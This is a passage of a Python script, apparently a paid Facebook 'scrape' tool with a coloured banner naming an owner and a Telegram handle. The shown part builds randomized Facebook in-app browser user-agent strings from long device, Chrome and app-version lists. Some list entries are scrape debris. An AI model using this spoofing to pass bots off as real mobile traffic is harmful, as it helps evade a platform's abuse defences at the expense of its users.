        {'model': 'SM-A125M', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'TECNO KE5k', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'Nokia X20', 'android_version': '13', 'build': 'TKQ1.220807.001'},
        {'model': 'moto e5', 'android_version': '8.0.0', 'build': 'OPP27.91-176'},
        {'model': 'KYV47', 'android_version': '11', 'build': '3.200HA.0237.a'},
        {'model': 'Redmi Note 9 Pro', 'android_version': '10', 'build': 'QKQ1.191215.002'},
        {'model': 'Grand 5.5 HD II', 'android_version': '7.0', 'build': 'NRD90M'},
        {'model': 'SM-A207F', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'SM-S102DL', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'CPH2197', 'android_version': '12', 'build': 'SKQ1.210216.001'},
        {'model': 'Nokia C10', 'android_version': '11', 'build': 'RP1A.201005.001'},
        {'model': 'SM-G973F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'CPH2135', 'android_version': '11', 'build': 'RKQ1.201217.002'},
        {'model': 'ANE-LX1', 'android_version': '9', 'build': 'HUAWEIANE-L21'},
        {'model': 'CPH2185', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'CLT-L09', 'android_version': '10', 'build': 'HUAWEICLT-L09'},
        {'model': 'SM-G9650', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'V2141', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'M2007J17G', 'android_version': '12', 'build': 'SKQ1.211006.001'},
        {'model': 'octopus', 'android_version': '11', 'build': 'R108-15183.78.0'},
        {'model': 'AFTEU011', 'android_version': '9', 'build': 'PS7614.3227N'},
        {'model': 'SM-G996B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'Redmi Note 9S', 'android_version': '12', 'build': 'SKQ1.211019.001'},
        {'model': 'SM-G981B', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'NEN-LX1', 'android_version': '10', 'build': 'HUAWEINEN-LX1'},
        {'model': 'BLA-L29', 'android_version': '10', 'build': 'HUAWEIBLA-L29S'},
        {'model': 'M2101K7BNY', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SM-T865', 'android_version': '12', 'build': 'SP2A.220305.013'},
        {'model': 'LYA-L09', 'android_version': '10', 'build': 'HUAWEILYA-L09'},
        {'model': 'Redmi 8', 'android_version': '10', 'build': 'QKQ1.191014.001'},
        {'model': 'RMX3241', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SM-A226B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'RMX3370', 'android_version': '12', 'build': 'RKQ1.211103.002'},
        {'model': 'POCO X2', 'android_version': '11', 'build': 'RKQ1.200826.002'},
        {'model': 'CPH2207', 'android_version': '11', 'build': 'RKQ1.200903.002'},
        {'model': 'L50', 'android_version': '10.0', 'build': 'NRD90M'},
        {'model': 'W-K560-EEA', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'OUKITEL U2', 'android_version': '5.1', 'build': 'LMY47D'},
        {'model': '22041219NY', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'Redmi Note 8T', 'android_version': '11', 'build': 'RKQ1.201004.002'},
        {'model': 'ASUS_Z012S', 'android_version': '8.0.0', 'build': 'OPR1.170623.026'},
        {'model': 'vivo 1908', 'android_version': '8.1.0', 'build': 'O11019'},
        {'model': 'MAR-LX1A', 'android_version': '10', 'build': 'HUAWEIMAR-L21A'},
        {'model': 'CPH2359', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-M317F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': '5003D_EEA', 'android_version': '8.1.0', 'build': 'OPM2.171019.012'},
        {'model': 'SM-J330FN', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-M307FN', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'W-V800-EEA', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'WAS-TL10', 'android_version': '8.0.0', 'build': 'HUAWEIWAS-TL10'},
        {'model': 'CPH2337', 'android_version': '13', 'build': 'TP1A.220905.001'},
        {'model': 'moto e6', 'android_version': '9', 'build': 'PCB29.73-65-3'},
        {'model': 'SM-G955F', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'DRA-LX2', 'android_version': '8.1.0', 'build': 'HUAWEIDRA-LX2'},
        {'model': 'E6653', 'android_version': '7.1.1', 'build': '32.4.A.1.54'},
        {'model': 'GT-I9300', 'android_version': '4.0.4', 'build': 'IMM76D'},
        {'model': 'SM-G970U1', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'POT-LX3', 'android_version': '10', 'build': 'HUAWEIPOT-L03'},
        {'model': 'KFMUWI', 'android_version': '7.1.2', 'build': 'NS6315'},
        {'model': 'Pixel 3', 'android_version': '10', 'build': 'QQ3A.200605.001'},
        {'model': 'FBCA/armeabi-v7a:armeabi', 'android_version': 'B4A', 'build': '/FB4A'},
        {'model': 'VOG-L29', 'android_version': '10', 'build': 'HUAWEIVOG-L29'},
        {'model': 'moto e5 plus', 'android_version': '8.0.0', 'build': 'OPPS27.91-179-8-16'},
        {'model': 'SM-J730F', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-G7102', 'android_version': '4.3', 'build': 'JLS36C'},
        {'model': 'SM-A505GT', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': '] FBBK/', 'android_version': '10', 'build': 'k/2.1.0'},
        {'model': 'EVR-N29', 'android_version': '10', 'build': 'HUAWEIEVR-N29'},
        {'model': 'SM-G532G', 'android_version': '6.0.1', 'build': 'MMB29T'},
        {'model': 'SM-G960U', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'SM-G950U', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'LG-H901', 'android_version': '7.0', 'build': 'NRD90U'},
        {'model': 'SM-G965F', 'android_version': '8.0', 'build': 'MMB29K'},
        {'model': 'SM-A305F', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': '] FBBK/', 'android_version': '9', 'build': 'k/2.1.0'},
        {'model': 'CPH1727', 'android_version': '7.1.1', 'build': 'N6F26Q'},
        {'model': 'W6500', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-I9500', 'android_version': '4.3', 'build': 'JSS15J'},
        {'model': 'oppo r7sm', 'android_version': '5.1.1', 'build': 'LYZ28N'},
        {'model': 'SM-S111DL', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'Z797C', 'android_version': '4.3', 'build': 'JLS36C'},
        {'model': 'DUB-LX1', 'android_version': '8.1.0', 'build': 'HUAWEIDUB-LX1'},
        {'model': 'GT-I9300', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-I9305', 'android_version': '4.3', 'build': 'JSS15J'},
        {'model': 'Lenovo A6020a46', 'android_version': '5.1.1', 'build': 'LMY47V'},
        {'model': 'FIG-LX1', 'android_version': '9', 'build': 'HUAWEIFIG-L31'},
        {'model': 'Kirin Treble', 'android_version': '9', 'build': 'PQ2A.190405.003'},
        {'model': 'SM-G973F', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'SM-G925F', 'android_version': '7.0', 'build': 'NRD90M'},
        {'model': 'SM-G955F', 'android_version': '7.1.2', 'build': 'NRD90M'},
        {'model': 'HUAWEI LUA-L21', 'android_version': '5.1', 'build': 'HUAWEILUA-L21'},
        {'model': 'ATU-L31', 'android_version': '8.0.0', 'build': 'HUAWEIATU-L31'},
        {'model': 'NX55', 'android_version': '4.4.2', 'build': 'KOT5506'},
        {'model': 'U', 'android_version': '6.0', 'build': 'MXB48T'},
        {'model': 'SM-J320F', 'android_version': '5.1.1', 'build': 'LMY47V'},
        {'model': 'SM-G3518', 'android_version': '4.4.2', 'build': 'JLS36C'},
        {'model': 'SM-G3518', 'android_version': '5', 'build': 'JLS36C'},
        {'model': 'SM-A505FM', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'GT-S7580L', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'SM-G930V', 'android_version': '7.0', 'build': 'NRD90M'},
        {'model': 'moto g(20)', 'android_version': '11', 'build': 'RTAS31.68-20-2'},
        {'model': 'HUAWEI G750-U10', 'android_version': '6.1', 'build': 'HuaweiG750-U10'},
        {'model': 'SM-G986U', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'SM-A102U', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'COL-L29', 'android_version': '9', 'build': 'HUAWEICOL-L29'},
        {'model': 'moto e', 'android_version': '10', 'build': 'QPGS30.82-135-16'},
        {'model': 'SM-A326U', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'Quest 2', 'android_version': '10', 'build': 'QQ3A.200805.001'},
        {'model': 'SM-A107M', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'LM-X420', 'android_version': '9', 'build': 'PKQ1.190302.001'},
        {'model': 'LGL355DL', 'android_version': '10', 'build': 'QKQ1.200108.002'},
        {'model': 'FBOP/20]', 'android_version': '9', 'build': 'R99-14469.41.0'},
        {'model': 'moto g power (2021)', 'android_version': '11', 'build': 'RZBS31.Q2-143-27-7'},
        {'model': 'Lenovo TB-X505F', 'android_version': '10', 'build': 'QKQ1.191224.003'},
        {'model': 'RMX2155', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'ASUS_I005DC', 'android_version': '11', 'build': 'RKQ1.210303.002'},
        {'model': 'SM-T290', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'S45B', 'android_version': '8.1.0', 'build': 'OPM2.171019.012'},
        {'model': 'SM-G990U', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': '220333QAG', 'android_version': '11', 'build': 'RKQ1.211001.001'},
        {'model': 'vivo 1935', 'android_version': '2.3.0', 'build': 'QP1A.190711.020'},
        {'model': 'ASUS_Z01QD', 'android_version': '7.1.2', 'build': 'N2G48H'},
        {'model': 'NAM-LX9', 'android_version': '11', 'build': 'HUAWEINAM-L29'},
        {'model': 'FB_FW/1', 'android_version': '10', 'build': 'k/2.1.0'},
        {'model': 'LM-Q610.FG', 'android_version': '8.1.0', 'build': '011019'},
        {'model': 'RMX3151', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SM-J250F', 'android_version': '7.1.1', 'build': 'NMF26X'},
        {'model': 'Moto', 'android_version': '5', 'build': 'QP1A.244982.977'},
        {'model': '2201117SY', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'moto e(7i) power', 'android_version': '10', 'build': 'QOJS30.506-7-18'},
        {'model': 'D6503', 'android_version': '6.0.1', 'build': '23.5.A.1.291'},
        {'model': 'moto g go', 'android_version': '11', 'build': 'RRHG31.Q3-37-43-43-5-4'},
        {'model': '20&#039', 'android_version': '9.0', 'build': 'LMY47I'},
        {'model': 'moto e(7) plus', 'android_version': '10', 'build': 'QPZS30.30-Q3-38-69-12'},
        {'model': 'Pixel 6a', 'android_version': '13', 'build': 'TQ2A.230505.002'},
        {'model': 'MMB29K', 'android_version': '7.0.0', 'build': 'GT-I5508'},
        {'model': 'GT-N7105', 'android_version': '7.0.0', 'build': 'GT-7320'},
        {'model': 'SM-N975F', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'VIA_P3', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-S901U', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'F1w', 'android_version': '5.1.1', 'build': 'LMY47V'},
        {'model': 'TECNO KI5k', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'M5 Note', 'android_version': '7.0', 'build': 'NRD90M'},
        {'model': 'SM-S134DL', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'Dragon Face', 'android_version': '8.1', 'build': 'NHG47L'},
        {'model': 'Vowney', 'android_version': '5.1', 'build': 'LMY47I'},
        {'model': 'JKM-LX1', 'android_version': '9', 'build': 'HUAWEIJKM-LX1'},
        {'model': 'CPH2385', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-A125F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'M2101K7BNY', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'moto g play - 2023', 'android_version': '12', 'build': 'S3SGS32.39-181-5'},
        {'model': 'M2103K19G', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'SM-T835', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'Leelbox', 'android_version': '13', 'build': 'PPR1.281373.396'},
        {'model': 'Z6356T', 'android_version': '11', 'build': 'RP1A.201005.001'},
        {'model': 'RNE-L22', 'android_version': '8.0.0', 'build': 'HUAWEIRNE-L22'},
        {'model': 'Samsung Galaxy S21', 'android_version': '13.0', 'build': 'OPR1.8610'},
        {'model': 'SM-G780G', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'SM-A032F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-G770F', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'vivo 1920', 'android_version': '12', 'build': 'SP1A.210812.003'},
        {'model': '2209116AG', 'android_version': '13', 'build': 'TKQ1.221114.001'},
        {'model': 'SM-A235F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-F936B', 'android_version': '13', 'build': 'TP1A.220624.014'},
    ]
    

    # Please extract and refine the list of Chrome version numbers from the html file I provided and give it to me as a text file.
    chrome_versions = ['75.0.3770.143', '76.0.3809.89', '76.0.3809.111', '76.0.3809.132', '77.0.3865.92', '77.0.3865.116', '78.0.3904.62', '78.0.3904.96', '78.0.3904.108', '79.0.3945.79',
                         '79.0.3945.93', '79.0.3945.116', '79.0.3945.136', '80.0.3987.87', '80.0.3987.99', '80.0.3987.119', '80.0.3987.132', '80.0.3987.149', '80.0.3987.162', '81.0.4044.96',
                         '81.0.4044.111', '81.0.4044.117', '81.0.4044.138', '83.0.4103.96', '83.0.4103.101', '83.0.4103.106', '84.0.4147.89', '84.0.4147.105', '84.0.4147.111', '84.0.4147.125',
                         '85.0.4183.81', '85.0.4183.101', '85.0.4183.120', '85.0.4183.127', '86.0.4240.75', '86.0.4240.99', '86.0.4240.110', '86.0.4240.114', '86.0.4240.185', '86.0.4240.198',
                         '87.0.4280.66', '87.0.4280.86', '87.0.4280.101', '87.0.4280.141', '88.0.4324.141', '88.0.4324.152', '88.0.4324.181', '89.0.4389.72', '89.0.4389.86', '89.0.4389.90',
                         '123.0.6312.40', '60.0.3112.107', '61.0.3163.98', '74.0.3729.112', '105.0.5195.124', '106.0.5249.65', '106.0.5249.79', '106.0.5249.118', '106.0.5249.126', '107.0.5304.91',
                         '107.0.5304.105', '107.0.5304.141', '108.0.5359.128', '109.0.5414.86', '109.0.5414.117', '110.0.5481.64', '110.0.5481.154', '111.0.5563.48', '111.0.5563.57', '111.0.5563.115',
                         '112.0.5615.48', '112.0.5615.100', '112.0.5615.101', '112.0.5615.136', '113.0.5672.77', '113.0.5672.131', '114.0.5735.53', '114.0.5735.58', '114.0.5735.61', '114.0.5735.131',
                         '115.0.5790.136', '115.0.5790.138', '115.0.5790.139', '116.0.5845.92', '116.0.5845.114', '116.0.5845.172', '116.0.5845.173', '117.0.5938.140', '117.0.5938.153', '118.0.5993.80',
                         '118.0.5993.81', '119.0.6045.163', '119.0.6045.193', '120.0.6099.43', '120.0.6099.44', '120.0.6099.194', '120.0.6099.211', '121.0.6167.101', '121.0.6167.164', '122.0.6261.43',
                         '122.0.6261.90', '122.0.6261.105', '122.0.6261.106', '122.0.6261.119', '123.0.6312.40', '89.0.4389.105', '90.0.4430.66', '90.0.4430.82', '90.0.4430.91', '90.0.4430.210',
                         '91.0.4472.77', '91.0.4472.88', '91.0.4472.101', '91.0.4472.114', '91.0.4472.120', '91.0.4472.134', '91.0.4472.164', '92.0.4515.105', '92.0.4515.115', '92.0.4515.131', '92.0.4515.159',
                         '92.0.4515.166', '93.0.4577.62', '93.0.4577.82', '94.0.4606.61', '94.0.4606.80', '94.0.4606.85', '95.0.4638.50', '95.0.4638.74', '96.0.4664.45', '96.0.4664.92', '96.0.4664.104',
                         '97.0.4692.70', '97.0.4692.98', '98.0.4758.87', '98.0.4758.101', '99.0.4844.58', '99.0.4844.73', '99.0.4844.88', '100.0.4896.58', '100.0.4896.79', '100.0.4896.88', '100.0.4896.127',
                         '101.0.4951.41', '101.0.4951.61', '102.0.5005.59', '102.0.5005.78', '102.0.5005.99', '102.0.5005.125', '103.0.5060.70', '103.0.5060.71', '103.0.5060.129', '104.0.5112.97',
                         '105.0.5195.68', '105.0.5195.79', '123.0.6312.40'
    ]

    # Please extract and refine the list of Facebook version numbers from the html file I provided and give it to me as a text file.
    fb_versions = ['382.0.0.33.111', '383.0.0.23.106', '384.1.0.29.111', '385.0.0.32.114', '386.0.0.35.108', '387.0.0.24.102', '388.0.0.32.105', '389.0.0.42.111', '390.0.0.27.105', '391.0.0.33.104',
                   '391.1.0.37.104', '392.0.0.32.108', '392.2.0.33.108', '394.0.0.50.107', '394.1.0.51.107', '395.0.0.27.214', '396.0.0.21.104', '396.1.0.28.104', '397.0.0.23.404', '398.0.0.21.105',
                   '399.0.0.24.93', '400.0.0.37.76', '401.0.0.24.77', '402.0.0.21.84', '403.0.0.27.81', '404.0.0.35.70', '405.0.0.23.72', '405.1.0.28.72', '406.0.0.26.90', '407.0.0.30.97', '408.1.0.36.103',
                   '409.0.0.27.106', '410.0.0.26.115', '411.1.0.29.112', '412.0.0.22.115', '413.0.0.30.104', '414.0.0.30.113', '415.0.0.34.107', '416.0.0.35.85', '417.0.0.33.65', '418.0.0.33.69',
                   '419.0.0.29.71', '419.0.0.37.71', '420.0.0.32.61', '426.0.0.26.50', '427.0.0.31.63', '443.0.0.23.229', '445.0.0.34.118', '450.0.0.42.110', '454.0.0.0.77', '330.0.0.31.120', '331.1.0.29.117',
                   '332.0.0.23.111', '336.0.0.20.117', '337.0.0.32.118', '338.1.0.36.118', '339.0.0.32.118', '340.0.0.27.113', '341.0.0.30.73', '342.0.0.37.119', '343.0.0.37.117', '344.0.0.34.116',
                   '345.0.0.34.118', '346.0.0.29.119', '348.0.0.39.118', '349.0.0.39.470', '350.1.0.29.106', '351.0.0.38.117', '352.0.0.20.117', '353.0.0.34.116', '354.0.0.22.110', '356.0.0.28.112',
                   '357.0.0.23.115', '358.0.0.34.117', '359.0.0.30.118', '360.0.0.30.113', '361.0.0.39.115', '362.0.0.27.109', '363.0.0.30.112', '364.0.0.24.132', '364.1.0.25.132', '365.0.0.30.112',
                   '366.1.0.20.113', '367.0.0.24.107', '367.2.0.26.107', '368.0.0.24.108', '369.0.0.18.103', '370.0.0.23.112', '371.0.0.24.109', '372.1.0.23.107', '373.0.0.31.112', '374.0.0.20.109',
                   '375.0.0.26.111', '375.1.0.28.111', '376.0.0.12.108', '377.0.0.22.107', '378.0.0.18.112', '379.0.0.24.109', '380.0.0.29.109', '381.0.0.29.105', '222.0.0.10.118', '282.0.0.40.117',
                   '283.0.0.31.121', '284.0.0.50.107', '285.0.0.43.120', '286.0.0.48.112', '288.0.0.46.123', '289.0.0.40.121', '290.0.0.44.121', '291.0.0.44.120', '292.0.0.60.123', '292.0.0.61.123',
                   '293.0.0.43.120', '294.0.0.39.118', '295.0.0.34.119', '296.0.0.44.119', '297.0.0.36.116', '298.0.0.46.116', '299.0.0.51.236', '300.0.0.51.129', '300.1.0.57.129', '300.2.0.58.129',
                   '302.0.0.45.119', '303.0.0.30.122', '304.0.0.39.118', '305.0.0.40.120', '305.1.0.40.120', '306.1.0.40.119', '307.0.0.40.111', '308.0.0.42.118', '309.0.0.45.119', '309.0.0.47.119',
                   '310.0.0.50.118', '312.0.0.45.117', '313.0.0.35.119', '314.0.0.43.119', '314.1.0.45.119', '315.0.0.47.113', '316.0.0.54.116', '317.0.0.51.119', '318.0.0.39.154', '319.0.0.39.120',
                   '320.0.0.34.118', '322.0.0.35.121', '324.0.0.48.120', '325.0.0.36.170', '326.0.0.34.120', '328.0.0.22.119', '328.1.0.28.119', '329.0.0.29.120'
    ]

    # Randomly select a device configuration
    device_config = random.choice(device_configurations)

    # Extract details from the chosen configuration
    model = device_config['model']
    android_version = device_config['android_version']
    build = device_config['build']
    
    chrome_version = random.choice(chrome_versions)
    fb_version = random.choice(fb_versions)

    # Construct the user agent string using the extracted details
    ua = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {model} Build/{build}; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} "
        f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_version};]"
    )
    
    return ua
    
logo= ("""
\033[1;22mMozilla-StandardA1 SCRAPE P2
\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[38;5;40m██╗    ██╗████████╗██╗  ██╗██████╗ ██████╗ 
\033[38;5;76m██║    ██║╚══██╔══╝██║  ██║██╔══██╗╚════██╗
\033[38;5;112m██║ █╗ ██║   ██║   ███████║██████╔╝ █████╔╝
\033[38;5;148m██║███╗██║   ██║   ╚════██║██╔═══╝ ██╔═══╝ 
\033[38;5;184m╚███╔███╔╝   ██║        ██║██║     ███████╗
\033[1;220m ╚══╝╚══╝    ╚═╝        ╚═╝╚═╝     ╚══════╝
\033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
\033[38;5;45m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mOWNER           \033[38;5;226m ━━━━━    \033[1;32m Oakarmin mg          \033[38;5;45m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTELEGRAM        \033[38;5;226m ━━━━━   \033[1;32m  @wt4p2p wtz          \033[38;5;43m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mMETHOD          \033[38;5;226m ━━━━━   \033[1;32mSCRAPE METHOD          \033[38;5;43m┃
\033[38;5;44m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL STATUS     \033[38;5;226m ━━━━━    \033[1;32mPAID VERSION          \033[38;5;44m┃
\033[38;5;42m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL VERSION    \033[38;5;226m ━━━━━     \033[1;32m      1.0.0          \033[38;5;42m┃
\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():
	print(f'\033[1;97m ══════════════════════════════════════════════════════')

main()